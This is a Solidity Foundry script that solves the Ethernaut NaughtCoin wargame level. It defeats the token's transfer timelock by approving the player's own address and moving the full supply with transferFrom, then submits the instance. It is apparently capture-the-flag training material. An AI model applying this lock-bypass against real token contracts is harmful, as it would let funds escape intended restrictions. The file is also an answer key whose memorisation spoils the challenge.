// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "src/15/NaughtCoin.sol";
import {NaughtCoinFactory} from "src/15/NaughtCoinFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract NaughtCoinExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL15_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new NaughtCoinFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        address player = vm.addr(deployerKey); //@note do not use msg.sender as prank and broadcast only change the msg.sender of the following external call by design. They do not change the current msg.sender of the script execution. https://github.com/foundry-rs/foundry/issues/3917
        NaughtCoin(instance).approve(player, NaughtCoin(instance).INITIAL_SUPPLY());
        NaughtCoin(instance).transferFrom(player, instance, NaughtCoin(instance).INITIAL_SUPPLY());

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
